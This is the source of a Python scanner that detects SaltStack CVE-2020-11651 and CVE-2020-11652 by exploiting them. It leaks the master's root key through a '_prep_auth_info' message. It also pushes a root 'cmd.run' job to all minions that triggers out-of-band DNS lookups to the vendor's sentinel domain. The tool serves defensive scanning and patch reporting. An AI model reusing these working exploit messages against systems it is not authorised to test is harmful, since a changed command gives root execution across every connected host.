"""
[1]	What is it?

Scanning tool to test for SaltStack vulnerabilities CVE-2020-11651 & CVE-2020-11652.

The vulnerabilities allow an attacker who can connect to the "request server" port to bypass all authentication
and authorization controls and publish arbitrary control messages, read and write files anywhere on the "master"
server filesystem and steal the secret key used to authenticate to the master as root. The impact is full remote
command execution as root on both the master and all minions that connect to it.

[2] How to install it.

The tool requires Python 2.7 or Python 3. External requirements can be installed with pip or easy_install.
For example:

sudo pip install -r requirements.txt


[3]	How to use it?

There are 2 detection methods included: 

*	Token disclosure
	
	This method is invoked with the -t option and attempts to read the Salt root token by exploiting the flaw.
	Whilst this method is self contained, it only works on newer versions, some older versions are not supported.


*	Out-of-Band (DNS) - RCE


	This method exploits the flaw by executing the nslookup command to trigger a DNS lookup to the Appcheck 
	Sentinel server. The scanner then consults the AppCheck DNS server to determine if it executed. To achieve
 	this the tool needs to connect out to https://ptst.io/

	Recommended command line: saltstack_rce_scanner.exe -r cidr_ip_range -t -c

[Command Line Options]

  ___              _____ _               _
 / _ \            /  __ \ |             | |
/ /_\ \_ __  _ __ | /  \/ |__   ___  ___| | __
|  _  | '_ \| '_ \| |   | '_ \ / _ \/ __| |/ /
| | | | |_) | |_) | \__/\ | | |  __/ (__|   <
\_| |_/ .__/| .__/ \____/_| |_|\___|\___|_|\_\
      | |   | |
      |_|   |_|

      SaltStack Scanner (CVE-2020-11651 & CVE-2020-11652)
      Author:   Gary O'Leary-Steele
      Version:  0.1 Alpha
Use -h to see usage options

optional arguments:
  -h, --help      show this help message and exit
  -r CIDR_RANGE   Target Host or CIDR Range to scan
  -p PORT         Target Port (4506 by default)
  -c              Enable remote command injection test (out-of-band DNS to
                  AppCheck Sentinel)
  -t              Enable root token disclosure check
  -T THREADS      Maximum Threads (default is 50)
  -o OUTPUT_FILE  Output file
"""

import __future__
import salt.transport.client
import random
import time
import requests
import string
import json
import ipaddr
from reporting import HTMLDoc, Table
from progressbar import ProgressBar, Bar, ETA, ReverseBar
from socket import *
import threading
try:
    import Queue
except:
    import queue as Queue
import random
import string
import re
import sys
import argparse
VULNS = []
def rnd_number(N):
    return ''.join(random.choice(string.digits) for x in range(N))

def code_block(s):
    return "<br/><pre><code>" + s +"</code></pre><br/>"

thread_lock = threading.Lock()
class ThreadDispatcher():
    def __init__(self, *args, **kargs):
        self.max_threads = kargs.get("max_threads", 10)
        # Store the return value within self.return_queue. Set to 0 to disable
        self.store_return = kargs.get("store_return", 1)
        self.semaphore = threading.Semaphore(self.max_threads)
        self.threads = []
        self.call_queue = []
        self.return_queue = Queue.Queue()

    def add(self, function):
        self.call_queue.append(function)

    def __dispatch_threads(self):
        while True:
            # Check to see if all threads are used
            if len(self.call_queue) != 0:

                try:
                    sem_val = self.semaphore._Semaphore__value
                except:
                    # Python 3
                    sem_val = self.semaphore._value 
                if sem_val != 0:
                    func = self.call_queue.pop()
                    thread = threading.Thread(target=self.__thread, args=(func,))
                    self.threads.append(thread)
                    thread.demon = True
                    thread.start()
                else:
                    # If all threads are taken
                    time.sleep(0.1)
            else:
                break

    def __thread(self, func):
        try:
            # Acquire semaphore and execute fuction
            self.semaphore.acquire()
            if self.store_return == 1:
                result = func()
                if result:
                    self.return_queue.put(result)
            else:
                func()

        except Exception as err:
            print("[i] Thread Error " + str(err))
        finally:
            self.semaphore.release()

    def start(self):
        self.__dispatch_threads()
        for thread in self.threads: thread.join()

def socket_ping(host, port=4506, timeout=2):
    """
    Check a port is open before heavier tasks.
    """
    try:
        s=socket(AF_INET, SOCK_STREAM) # TCP Socket
        s.settimeout(timeout)
        if s.connect_ex((host, port)) == 0:
            return True
        else:
            return False
    except Exception as err:
        #s.close()
        return None

SENTINEL_DOMAIN = "ptst.io"

def token_generation():
    N = 32

    return "SENTINEL" + ''.join(random.choice(string.ascii_uppercase +string.ascii_lowercase + string.digits) for x in range(N))

def expand_network(network):
    """
    Uses googles ipaddr library to expand slash notation
    returns a list of strings
    """

    if network == "" or network == "\n":
        return []

    if "/" not in network :
        return [network]
    
    elif network.split("/")[1] == "32":
        return [network]
    
    elif re.search("/\d{1,2}",network):
        network = ipaddr.IPv4Network(network)
        host_list = list()
        for x in network.iterhosts():
            host_list.append(str(x))
        return host_list
    else:
        print("Error Parsing target:" + str(network))

def lookup_tokens_by_batch(token_list, since_epoc=1, timeout=25, username=None, password=None):
    api_endpoint = "https://" + SENTINEL_DOMAIN + "/bytoken"
    if type(token_list) != type([]):
        token_list = [token_list]
    try:
        tokens = ",".join(token_list)
        if username and password:
            response = requests.post(api_endpoint, data={"tokens":tokens}, timeout=timeout,
                                     auth=HTTPBasicAuth(username, password))
        else:
            response = requests.post(api_endpoint, data={"tokens":tokens}, timeout=timeout)

        return json.loads(response.text)
    except Exception as err:
        print("An error occurred fetching sentinel hits by token (batched)") 
        print(err)

class SaltStackCVE_2020_11651(object):
    """
    Detects and exploits saltstack CVE-2020-11651
    """
    NAME = "SaltStack (CVE-2020-11651 & CVE-2020-11652)"
    DESCRIPTION = """\
    #Synopsis

    Module to test for SaltStack vulnerabilities CVE-2020-11651 & CVE-2020-11652.
    
    The vulnerabilities allow an attacker who can connect to the "request server" port to bypass all authentication
    and authorization controls and publish arbitrary control messages, read and write files anywhere on the "master"
    server filesystem and steal the secret key used to authenticate to the master as root. The impact is full remote
    command execution as root on both the master and all minions that connect to it.
    
    """

    def __init__(self, attempt_key_extraction=True,attempt_command_execution=False):        
        self.attempt_key_extraction = attempt_key_extraction
        self.attempt_command_execution = attempt_command_execution
        self.include_container_friendly_rce_payloads = True
        self.stop_when_method_is_found = False

    def build_report(self, outputfile="report.html", print_to_console=True):
        if not VULNS:
            print("[i] No vulnerable hosts found")
            return
        if print_to_console:
            for vuln in VULNS:
               print("[VULNERABLE]", vuln.target_host, vuln.target_port)

        with thread_lock:
            print("[i] Writing report to: {}\n\n".format(outputfile))
        try:
            outputfile = open(outputfile,"w")
        except:
            rand =time.time()
            print("Could not open file for writing, using the following filename:", str(int(rand)) + outputfile)
            outputfile = open(str(int(rand)) + outputfile,"w")

        report = HTMLDoc()
        #report.add_scriptcode(popup_script)
        #report.add_scriptcode(collapse_js)

        report.add_html("<h1>SaltStack Vulnerability Report</h1>")
        vulns_table = Table(["Vulnerable Target","Port","Detail"])
        
        for vuln in VULNS:
            vulns_table.add_row(vuln.target_host, vuln.target_port, vuln.details)
        
        report.add_html(vulns_table.get_table_html())
        outputfile.write(report.get_document())
        outputfile.close()

    def emit_vuln(self, vuln):
        VULNS.append(vuln)
        with thread_lock:
            if 0:
                print("[!!] Vulnerable \t{}:{}".format(vuln.target_host, vuln.target_port))

    def _attempt_key_leak(self, clear_channel, timeout=5):
        try:
            msg = {"cmd": "_prep_auth_info"}
            result = clear_channel.send(msg, timeout=timeout)
            if result:
                for entry in result:
                    if type(entry) == type({}):
                        return json.dumps(entry)
        except:
            pass

    def _attempt_command_exec(self, clear_channel, command, target="*", timeout=5):
        try:
            jid = "202003100000000" + rnd_number(3)
            msg = {
                "cmd": "_send_pub",
                "fun": "cmd.run",
                "jid": jid,
                "arg": [command],
                "kwargs": {"show_jid": False, "show_timeout": False},
                "ret": "",
                "tgt": target,
                "tgt_type": "glob",
                "user": "root",
            }
            clear_channel.send(msg, timeout=timeout)
        except:
            pass


    def sentinel_command_check(self, clear_channel, target_host, target_port):

        ### Attempt sentinel command
        commands = []
        
        get_token = token_generation
        sentinel_domain = SENTINEL_DOMAIN
        token = get_token()
        command = "nslookup -type=txt " + token  + "." + sentinel_domain
        commands.append((command, token))

        if self.include_container_friendly_rce_payloads:
            # A docker friendly option where nslookup isnt available
            token = get_token()
            command = "tar xf -{}:/dev/cdrom".format(token  + "." + sentinel_domain)
            commands.append((command, token))

        for command_token in commands:
            command = command_token[0]
            token = command_token[1]

            self._attempt_command_exec(clear_channel, command)
            if token.lower().startswith("sentinel"):
                token = token[8:]
            sentinel_events = lookup_tokens_by_batch([token])
            count = 0
            if sentinel_events:
                meta = ""
                resolver = ""
                for event in sentinel_events:
                    # We can use this to double check but really we shouldnt be hitting false positves
                    # meta = json.loads(event["metadata"])
                    # if meta.get("type", None) != "TXT":
                    #   continue
                    resolver = event ["ipaddr"]
                    meta = event["metadata"]
                    count +=1

                details = "The vulnerability was detected by submitting the following command to be executed by " \
                          "each minion connected to the target Salt Master.\n\n"

                details += code_block(command)

                details += "When executed, each Minion host will perform a DNS lookup against a DNS " \
                           "server monitored by AppCheck (Sentinel). {} DNS lookup(s) were received during the test" \
                           " (one from each Salt Minion)\n\n<br/><br/>".format(str(count))

                details += "<b>Example Sentinel Interaction</b><br/><br/>\n\n"
                details += "<b>DNS Resolver:</b>\t{}\n\n<br/>".format(resolver) + "<br/>"
                details += "<b>DNS Lookup:</b>\n\n"
                details += code_block(meta) 
                vuln = SaltStackCVE_2020_11651_Vuln("SaltStack Authentication Bypass (CVE-2020-11651 & "
                                                    "CVE-2020-11652).", target_host, target_port)
                vuln.details = details
                self.emit_vuln(vuln)
                return True

    def check_target(self, target_host, port=4506):

        if not socket_ping(target_host, port):
            return
        else:
            with thread_lock:
                if 0:
                    print("[i] Port {} Open ".format(str(port)) + target_host +"\n")

        minion_config = {
            "transport": "zeromq",
            "pki_dir": "/tmp",
            "id": "root",
            "master_ip": target_host,
            "master_port": port,
            "auth_timeout": 5,
            "auth_tries": 1,
            "master_uri": "tcp://{0}:{1}".format(target_host, port),
        }

        try:
            clear_channel = salt.transport.client.ReqChannel.factory(minion_config, crypt="clear")
        except Exception as err:
            print(err)            
            return

        if self.attempt_key_extraction:
            keys = self._attempt_key_leak(clear_channel)
            if keys:
                vuln = SaltStackCVE_2020_11651_Vuln("SaltStack Authentication Bypass (CVE-2020-11651 & CVE-2020-11652)", target_host, port)
                details = "The vulnerability was detected by exploiting it to extract authentication keys from the " \
                          "target Salt Master.\n\n<br/>"

                details += "<br/><b>Extracted Keys:</b>\n\n"
                details += code_block(keys)
                vuln.details =details
                self.emit_vuln(vuln)
                if self.stop_when_method_is_found:
                    return

        if self.attempt_command_execution:
            success = self.sentinel_command_check(clear_channel, target_host, port)
            if success and self.stop_when_method_is_found:
                return
class Progress:

    bar = None
    counter = 0

    def __init__(self, maxvalue):
        self.maxvalue = maxvalue
        Progress.bar = ProgressBar(maxval=maxvalue).start()

    def update(self):
        with thread_lock:
            Progress.counter += 1
            Progress.bar.update(Progress.counter)

    def finish(self):
        self.bar.finish()

class SaltStackCVE_2020_11651_Vuln(object):
    """
    The target SaltStack system is vulnerable to several serious security flaws (CVE-2020-11651 & CVE-2020-11652) that
    could be exploited to take control of the Salt Master and all connected Salt Minion systems.

    DESCRIPTION

    The target SaltStack system is vulnerable to several serious security flaws (CVE-2020-11651 & CVE-2020-11652) that
    could be exploited to take control of the Salt Master and all connected Salt Minion systems.

    The vulnerabilities allow an attacker who can connect to the "request server" port to bypass all authentication
    and authorization controls and publish arbitrary control messages, read and write files anywhere on the "master"
    server filesystem and steal the secret key used to authenticate to the master as root. The impact is full remote
    command execution as root on both the master and all minions that connect to it.

    SOLUTION

    The vulnerabilities are patched in SaltStack version 3000.2 see https://repo.saltstack.com/ for more information.

    A patch release for the previous major release version is also available, with version number 2019.2.4.

    """
    def __init__(self, title, target_host, target_port):
        self.title = title
        self.target_host = target_host
        self.target_port = target_port
        self.details = ""

ascii_art =r"""
  ___              _____ _               _    
 / _ \            /  __ \ |             | |   
/ /_\ \_ __  _ __ | /  \/ |__   ___  ___| | __
|  _  | '_ \| '_ \| |   | '_ \ / _ \/ __| |/ /
| | | | |_) | |_) | \__/\ | | |  __/ (__|   < 
\_| |_/ .__/| .__/ \____/_| |_|\___|\___|_|\_\
      | |   | |                               
      |_|   |_|                               

      SaltStack Scanner (CVE-2020-11651 & CVE-2020-11652)
      Author:   Gary O'Leary-Steele
      Version:  0.1 Alpha
"""#.encode("ascii","ignore")

def saltstack_test(target="192.168.56.130"):
    plugin = SaltStackCVE_2020_11651()
    plugin.check_target(target)
    plugin.build_report()


if __name__=='__main__':
    
    banner = ascii_art
    parser = argparse.ArgumentParser(usage=r"{0}Use -h to see usage options".format(banner))

    parser.add_argument(
        '-r',default=None,
        dest='cidr_range',
        help='Target Host or CIDR Range to scan')

    parser.add_argument(
        '-p',default=4506,
        dest='port',
        help='Target Port (4506 by default)')

    parser.add_argument(
        '-c',
        action="store_true",
        dest='enable_command_injection',default=False,
        help='Enable remote command injection test (out-of-band DNS to AppCheck Sentinel) ')

    parser.add_argument(
        '-t',
        action="store_true",
        dest='enable_token_leak',default=False,
        help='Enable root token disclosure check')
        
    parser.add_argument(
        '-T',
        dest='threads',default=50,
        help='Maximum Threads (default is 50)')

    parser.add_argument(
        '-o',
        dest='output_file',default="report{0}.html".format(str(int(time.time()))),
        help='Output file')

    options = parser.parse_args()

    if not options.cidr_range :
        print("Must Supply Target Range or host with -r (use -h to see options)")
        sys.exit()
    if not options.enable_token_leak and not options.enable_command_injection:
        print("Must enable -t , -c or both to perform checks (use -h to see options)")
        sys.exit()

    plugin = SaltStackCVE_2020_11651(attempt_key_extraction=options.enable_token_leak, attempt_command_execution=options.enable_command_injection)
    threader = ThreadDispatcher(max_threads=int(options.threads))
    count = 0
    network = expand_network(options.cidr_range)
    print(ascii_art)
    print("[i] Scanning {} targets".format(len(network)))

    status_bar = Progress(maxvalue=len(network))
    for target in network:
        count +=1
        def factory():
            target_host = target
            def check():
                try:
                    status_bar.update()
                    return plugin.check_target(target_host, options.port)
                except Exception as err:
                    print("Error checking: ", target_host, err)
            return check
        threader.add(factory())
    threader.start()
    status_bar.finish()
    plugin.build_report(options.output_file)
    

